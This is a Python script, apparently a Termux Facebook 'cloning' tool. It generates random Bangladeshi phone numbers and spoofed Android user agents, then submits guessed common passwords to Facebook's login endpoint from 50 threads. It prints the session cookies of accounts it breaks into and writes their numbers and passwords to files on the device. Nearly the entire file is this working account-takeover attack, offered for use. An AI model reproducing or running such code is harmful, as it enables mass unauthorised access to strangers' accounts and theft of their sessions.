"""
@ Reverse By : R_Fuxer
@ Supported By : Ahmed Ali
@ Follow Our Github : Ahmed-xd
"""

# Facebook: MD RAKIB KING
# Github: RAKIB-HACKING-TIM 
import os,sys,time,json,random,re,string,platform,base64,uuid
#os.system("git pull")
#os.system("pip uninstall requests")
#os.system("pip install requests")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
  
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system('espeak -a 300 " Welcome,   to,  RAKIB, KING, TERMUX, HACKING, TIM, Tools, join, My, Facebook, Group"')  
os.system("xdg-open https://m.facebook.com/groups/187986870133162/")
logo =("""
\x1b[1;92m██████░░░█████░░██░░░██░██░██████░░ 
\x1b[1;92m██░░░██░██░░░██░██░░██░░██░██░░░██░ 
\x1b[1;92m██████░░███████░█████░░░██░██████░░ 
\x1b[1;92m██░░░██░██░░░██░██░░██░░██░██░░░██░ 
\x1b[1;92m██░░░██░██░░░██░██░░░██░██░██████░░
\x1b[1;92m┏─────────────────────────────────────────┓
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m AUTHOR     \x1b[1;97m: \x1b[1;92mRAKIB 𝐊𝐈𝐍𝐆     
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m FACEBOOK   \x1b[1;97m: \x1b[1;92mMD RAKIB 𝐊𝐈𝐍𝐆
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m WHATSAPP   \x1b[1;97m: \x1b[1;92m+𝟴𝟴𝟬𝟭𝟳24273808               
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m STATUS     \x1b[1;97m: \x1b[1;92mALL 𝐂𝐋𝐎𝐍𝐈𝐍𝐆 \V.S/ 0.7
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m GITHUB     \x1b[1;97m: \x1b[1;92mRAKIB-HACKING-TIM         
\x1b[1;92m┗─────────────────────────────────────────┛
\033[1;32m----------------------------------------""")
loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
 
#User agents
ugen2=[]
ugen=[]
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
for xd in range(20000):
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12','13','14','15','16','17','18'])
	c='RMX1931 '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/RKQ1.200928.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,113)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	hiya=(f'{aa} {b}; {c}{d}{e}{f} {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(hiya)        
#Relme A16
for xd in range(12000):
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12','13','14','15','16','17','18'])
	c='CPH2269 '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(40,109)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	sarmin=(f'{aa} {b}; {c}{d}{e}{f} {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(sarmin)        
#walton primo rx7
for xd in range(10100):
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12','13','14','15','16','17','18'])
	c='Primo RX7 '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(40,110)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	tamanna=(f'{aa} {b}; {c}{d}{e}{f} {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(tamanna)        
#samsung ultra s20
for xd in range(8000):
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12','13','14','15','16','17','18'])
	c='SM-G988B','SM-G988','SM-G988U','SM-G988U1','SM-G9880','SM-G988B/DS','SM-G988N','SM-G988B','SM-G988W '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(40,115)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	hasan=(f'{aa} {b}; {c}{d}{e}{f}{g}{h}.{i}.{j}.{k} {l}')
	ugen.append(hasan)        
#samsung ultra s23
for xd in range(7000):
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12','13','14','15','16','17','18'])
	c='SAMSUNG SM-S918U1','SM-S918B','SM-S918B/DS','SM-S918U','SM-S918U1','SM-S918W','SM-S918N','SM-S9180','SM-S918E','SM-S918E/DS '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=') AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/'
	h=random.randrange(40,115)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	asha=(f'{aa} {b}; {c}{d}{e}{f}{g}{h}.{i}.{j}.{k} {l}')
	ugen.append(asha)        
#samsun ultra s21
for xd in range(5000):
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12','13','14','15','16','17','18'])
	c='SAMSUNG SM-G998B','SM-G998B','SM-G998B/DS','SM-G998U','SM-G998U1','SM-G998W','SM-G998N','SM-G9980'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=') AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/'
	h=random.randrange(40,115)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	lucky=(f'{aa} {b}; {c}{d}{e}{f}{g}{h}.{i}.{j}.{k} {l}')
	ugen.append(lucky)        
	
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for sat in range(1000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
for sat in range(1000):
    a='Redmi'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
for si in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['9','10','11','12','13','14','15'])
	c='CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	turag=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(turag)

def uf():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    mr1 = '0171'
    mr2 = '0172'
    mr3 = '0175'
    mr4 = '017'
    code = random.choice([mr1,mr2,mr3]) 
    os.system('clear')
    print(logo)
    limit = int(input(f'\033[1;32m EXAMPLE : 500, 1000, 2000, 4000, 6000, 10000, \n\033[1;32m----------------------------------------\n [+] PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        clear()
        tl = str(len(user))
        print(f' \033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m YOUR TOTAL IDS: {xr}'+tl)
        print(' \033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m COUNTRY CODE : \033[1;32m'+code)
        print("\033[1;32m----------------------------------------")
        for love in user:
            #pwx =# [love[#1:]]
            pwx = [love[2:],love,code+love,code+love[:3],'bangladesh','free fire','i love you','708090','203040','506070','ayesha','Bangladesh','jannat','Free Fire','FREE FIRE','57273200']
            uid = code+love
            morshed.submit(rcrack,uid,pwx,tl)
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            sys.stdout.write(f'\r  \33[1;94m[\033[1;37mRAKIB\33[1;94m][\033[1;37m%s\33[1;94m/\033[1;37m%s\33[1;94m]\33[1;94m[\033[1;32mOK-%s\33[1;94m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ugen = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://x.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_rakib = {'authority': 'x.facebook.com',
            'method': 'GET',
            'path': '/login/',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'dpr': '1.75',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"SM-A037F"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"13.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,
            'viewport-width': '980',}
            lo = session.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_rakib).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[RAKIB💚] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[] \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/RAKIB-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[BLACK-CP] ' +uid+ ' • ' +ps+           '  \33[0;97m')
                open('/sdcard/RAKIB-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except:
        pass
 
uf()

  
